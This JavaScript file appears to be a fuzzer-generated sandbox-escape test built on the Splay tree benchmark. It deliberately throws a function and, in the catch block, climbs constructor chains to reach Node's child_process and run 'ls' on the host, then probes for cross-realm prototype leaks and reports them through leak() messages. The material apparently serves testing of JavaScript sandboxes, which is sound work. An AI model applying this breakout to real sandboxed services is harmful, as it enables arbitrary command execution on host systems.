try {
    var kSplayTreeSize = 8000;
    var kSplayTreeModifications = 80;
    var kSplayTreePayloadDepth = 5;
    var splayTree = null;
    function GeneratePayloadTree(depth, key) {
        let REPLACER = 23;
        if (depth == 0) {
            return {
                array: [
                    0,
                    1,
                    2,
                    3,
                    4,
                    5,
                    6,
                    7,
                    8,
                    9
                ],
                string: 'String for key ' + key + ' in leaf node'
            };
        } else {
            return {
                left: GeneratePayloadTree(depth - 1, key),
                right: GeneratePayloadTree(depth - 1, key)
            };
        }
    }
    function GenerateKey() {
        let REPLACER = 23;
        return Math.random();
    }
    function InsertNewNode() {
        let REPLACER = 23;
        var key;
        do {
            key = GenerateKey();
        } while (splayTree.find(key) != null);
        splayTree.insert(key, GeneratePayloadTree(kSplayTreePayloadDepth, key));
        return key;
    }
    function SplaySetup() {
        let REPLACER = 23;
        splayTree = new SplayTree();
        for (var i = 0; i < kSplayTreeSize; i++)
            InsertNewNode();
    }
    function SplayTearDown() {
        let REPLACER = 23;
        var keys = splayTree.exportKeys();
        splayTree = null;
        var length = keys.length;
        if (length != kSplayTreeSize) {
            throw new Error('Splay tree has wrong size');
        }
        for (var i = 0; i < length - 1; i++) {
            if (keys[i] >= keys[i + 1]) {
                throw new Error('Splay tree not sorted');
            }
        }
    }
    function SplayRun() {
        let REPLACER = 23;
        for (var i = 0; i < kSplayTreeModifications; i++) {
            var key = InsertNewNode();
            var greatest = splayTree.findGreatestLessThan(key);
            if (greatest == null)
                splayTree.remove(key);
            else
                splayTree.remove(greatest.key);
        }
    }
    function SplayTree() {
        let REPLACER = 23;
    }
    ;
    SplayTree.prototype.root_ = null;
    SplayTree.prototype.isEmpty = function () {
        let REPLACER = 23;
        return !this.root_;
    };
    SplayTree.prototype.insert = function (key, value) {
        let REPLACER = 23;
        if (this.isEmpty()) {
            this.root_ = new SplayTree.Node(key, value);
            return;
        }
        this.splay_(key);
        if (this.root_.key == key) {
            return;
        }
        var node = new SplayTree.Node(key, value);
        if (key > this.root_.key) {
            node.left = this.root_;
            node.right = this.root_.right;
            this.root_.right = null;
        } else {
            node.right = this.root_;
            node.left = this.root_.left;
            this.root_.left = null;
        }
        this.root_ = node;
    };
    SplayTree.prototype.remove = function (key) {
        let REPLACER = 23;
        if (this.isEmpty()) {
            throw Error('Key not found: ' + key);
        }
        this.splay_(key);
        if (this.root_.key != key) {
            throw Error('Key not found: ' + key);
        }
        var removed = this.root_;
        if (!this.root_.left) {
            this.root_ = this.root_.right;
        } else {
            var right = this.root_.right;
            this.root_ = this.root_.left;
            this.splay_(key);
            this.root_.right = right;
        }
        return removed;
    };
    SplayTree.prototype.find = function (key) {
        let REPLACER = 23;
        if (this.isEmpty()) {
            return null;
        }
        this.splay_(key);
        return this.root_.key == key ? this.root_ : null;
    };
    SplayTree.prototype.findGreatestLessThan = function (key) {
        let REPLACER = 23;
        if (this.isEmpty()) {
            return null;
        }
        this.splay_(key);
        if (this.root_.key <= key) {
            return this.root_;
        } else if (this.root_.left) {
            return this.findMax(this.root_.left);
        } else {
            return null;
        }
    };
    SplayTree.prototype.exportKeys = function () {
        let REPLACER = 23;
        var result = [];
        if (!this.isEmpty()) {
            this.root_.traverse_(function (node) {
                let REPLACER = 23;
                result.push(node.key);
            });
        }
        return result;
    };
    SplayTree.prototype.splay_ = function (key) {
        throw () => {
            return () => {
            };
        };
        if (this.isEmpty()) {
            return;
        }
        var dummy, left, right;
        dummy = left = right = new SplayTree.Node(null, null);
        var current = this.root_;
        while (true) {
            if (key < current.key) {
                if (!current.left) {
                    break;
                }
                if (key < current.left.key) {
                    var tmp = current.left;
                    current.left = tmp.right;
                    tmp.right = current;
                    current = tmp;
                    if (!current.left) {
                        break;
                    }
                }
                right.left = current;
                right = current;
                current = current.left;
            } else if (key > current.key) {
                if (!current.right) {
                    break;
                }
                if (key > current.right.key) {
                    var tmp = current.right;
                    current.right = tmp.left;
                    tmp.left = current;
                    current = tmp;
                    if (!current.right) {
                        break;
                    }
                }
                left.right = current;
                left = current;
                current = current.right;
            } else {
                break;
            }
        }
        left.right = current.left;
        right.left = current.right;
        current.left = dummy.right;
        current.right = dummy.left;
        this.root_ = current;
    };
    SplayTree.Node = function (key, value) {
        this.key = key;
        this.value = value;
    };
    SplayTree.Node.prototype.left = null;
    SplayTree.Node.prototype.right = null;
    SplayTree.Node.prototype.traverse_ = function (f) {
        var current = this;
        while (current) {
            var left = current.left;
            if (left)
                left.traverse_(f);
            f(current);
            current = current.right;
        }
    };
    SplaySetup();
    SplayRun();
    SplayTearDown();
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}